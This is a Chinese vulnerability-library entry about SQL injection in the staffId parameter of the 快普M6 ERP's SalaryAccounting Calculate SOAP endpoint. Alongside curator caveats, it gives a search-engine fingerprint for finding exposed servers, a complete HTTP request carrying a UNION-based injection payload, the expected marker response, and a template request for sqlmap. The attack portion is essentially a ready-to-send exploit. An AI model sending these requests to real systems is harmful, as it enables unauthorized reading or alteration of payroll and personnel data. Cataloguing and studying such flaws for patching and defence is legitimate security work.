---
source: "wy876 漏洞文库"
title: "快普M6 SalaryAccounting Calculate staffId SQL 注入"
product: "快普M6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "M6无build"
prerequisites: "带多种Cookie，最低认证未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yogdi0xnw4pvfsfa"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%BF%AB%E6%99%AE/%E5%BF%AB%E6%99%AEM6SalaryAccounting%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"Resource/JavaScript/jKPM6.DateTime.js\""
id: "vw-0eb7c401dc3fcf5f77c30b6f"
entity_id: "ve-0eb7c401dc3fcf5f77c30b6f"
schema_version: "1"
---

# 快普M6 SalaryAccounting Calculate staffId SQL 注入

## 条目说明

- 对象与具体问题：快普M6；SalaryAccounting Calculate staffId SQLi
- 版本、配置及部署条件：M6无build
- 认证与权限前提：带多种Cookie，最低认证未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- SOAP常量与预期字符串都有，缺实际响应/根因
- HTTP长度固定
- Calculate可能业务副作用，测试应隔离薪资数据
- Hunter误抽fofa且截断，无修复版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
快普软件是一款综合性的企业管理软件，它涵盖了财务管理、人力资源管理、供应链管理、生产制造等多个方面。该软件以强大的功能和灵活性著称，能够满足不同企业的个性化需求。通过快普软件，企业可以更加高效地管理财务、人事、供应链和生产制造等各个环节，实现业务流程的优化和协同。同时，该软件还支持移动办公，方便企业随时随地进行业务处理和管理。总之，快普软件是一款功能强大、易于使用的企业管理软件，能够帮助企业提高运营效率和管理水平。快普M6 SalaryAccounting存在SQL注入漏洞

## 二、影响版本
+ 快普M6

## 三、资产测绘
+ hunter`web.body="Resource/JavaScript/jKPM6.DateTime.js"`
+ 特征


## 四、漏洞复现
```http
POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=ecch4oew21q5s0d51waneyy4; http125331972318088ValidateCode=R3QT; iKey=IKEY%u8BBE%u5907%u672A%u8FDE%u63A5%uFF01; 3AB9D23F7A4B3C9B=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M; eid=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/Calculate
Content-Type: text/xml;charset=UTF-8
Host: 

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
 <soapenv:Header/>
 <soapenv:Body>
   <tem:Calculate>
    <!--type: string-->
    <tem:SalaryCategory></tem:SalaryCategory>
    <!--type: string-->
    <tem:StaffBirthDay></tem:StaffBirthDay>
    <!--type: string-->
    <tem:staffId>
    1) UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113)+CHAR(113)+CHAR(79)+CHAR(70)+CHAR(108)+CHAR(70)+CHAR(75)+CHAR(107)+CHAR(66)+CHAR(112)+CHAR(72)+CHAR(110)+CHAR(75)+CHAR(98)+CHAR(74)+CHAR(67)+CHAR(79)+CHAR(115)+CHAR(108)+CHAR(67)+CHAR(75)+CHAR(98)+CHAR(68)+CHAR(100)+CHAR(84)+CHAR(98)+CHAR(112)+CHAR(121)+CHAR(101)+CHAR(105)+CHAR(99)+CHAR(66)+CHAR(79)+CHAR(110)+CHAR(83)+CHAR(69)+CHAR(90)+CHAR(89)+CHAR(102)+CHAR(105)+CHAR(70)+CHAR(106)+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(98)+CHAR(113)-- PCzU</tem:staffId>
    <!--type: string-->
    <tem:Department></tem:Department>
    <!--type: string-->
    <tem:SubOrg></tem:SubOrg>
    <!--type: string-->
    <tem:taxMonthly></tem:taxMonthly>
   </tem:Calculate>
 </soapenv:Body>
</soapenv:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 1112；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```plain
qbbqqOFlFKkBpHnKbJCOslCKbDdTbpyeicBOnSEZYfiFjqbpbq
```

sqlmap

```http
POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=ecch4oew21q5s0d51waneyy4; http125331972318088ValidateCode=R3QT; iKey=IKEY%u8BBE%u5907%u672A%u8FDE%u63A5%uFF01; 3AB9D23F7A4B3C9B=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M; eid=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/Calculate
Content-Type: text/xml;charset=UTF-8
Host: 

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
 <soapenv:Header/>
 <soapenv:Body>
   <tem:Calculate>
    <!--type: string-->
    <tem:SalaryCategory></tem:SalaryCategory>
    <!--type: string-->
    <tem:StaffBirthDay></tem:StaffBirthDay>
    <!--type: string-->
    <tem:staffId>
    1)
    </tem:staffId>
    <!--type: string-->
    <tem:Department></tem:Department>
    <!--type: string-->
    <tem:SubOrg></tem:SubOrg>
    <!--type: string-->
    <tem:taxMonthly></tem:taxMonthly>
   </tem:Calculate>
 </soapenv:Body>
</soapenv:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 1112；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yogdi0xnw4pvfsfa>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
